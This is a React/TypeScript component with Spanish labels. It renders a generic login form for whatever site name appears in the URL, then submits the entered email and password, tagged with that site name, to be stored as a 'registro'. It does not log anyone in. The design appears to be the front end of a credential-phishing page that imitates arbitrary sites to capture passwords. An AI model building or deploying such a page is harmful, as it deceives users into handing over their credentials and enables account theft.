import { useState, type FormEvent } from 'react';
import { useParams } from 'react-router-dom';
import {
    Box,
    Button,
    FormControl,
    FormLabel,
    Input,
    VStack,
    Heading,
    Text,
    useColorModeValue,
} from '@chakra-ui/react';
import { PageContainer } from '../../../shared/ui/PageContainer';
import { useCreateRegistro } from '../hooks/useRegistros';

export const FormPage = () => {
    const { pagina } = useParams<{ pagina: string }>();
    const { submitRegistro, loading } = useCreateRegistro();

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        if (!pagina) return;

        const success = await submitRegistro({ email, password, pagina });
        if (success) {
            setEmail('');
            setPassword('');
        }
    };

    return (
        <PageContainer maxW="md">
            <Box
                bg={useColorModeValue('white', 'gray.700')}
                p={8}
                mt={10}
                borderRadius="lg"
                boxShadow="lg"
                borderTop="4px solid"
                borderColor="blue.500"
            >
                <VStack spacing={4} align="stretch">
                    <Heading size="lg" textAlign="center" color="blue.600">
                        Iniciar Sesión
                    </Heading>
                    <Text textAlign="center" color="gray.500" fontSize="sm">
                        Para continuar, ingresa tus credenciales.
                        <br />
                        (Sitio: {pagina})
                    </Text>

                    <form onSubmit={handleSubmit}>
                        <VStack spacing={4} mt={4}>
                            <FormControl id="email" isRequired>
                                <FormLabel>Correo Electrónico</FormLabel>
                                <Input
                                    type="email"
                                    placeholder="ejemplo@correo.com"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                />
                            </FormControl>

                            <FormControl id="password" isRequired>
                                <FormLabel>Contraseña</FormLabel>
                                <Input
                                    type="password"
                                    placeholder="********"
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                />
                            </FormControl>

                            <Button
                                type="submit"
                                colorScheme="blue"
                                width="full"
                                isLoading={loading}
                                loadingText="Enviando..."
                            >
                                Ingresar
                            </Button>
                        </VStack>
                    </form>
                </VStack>
            </Box>
        </PageContainer>
    );
};
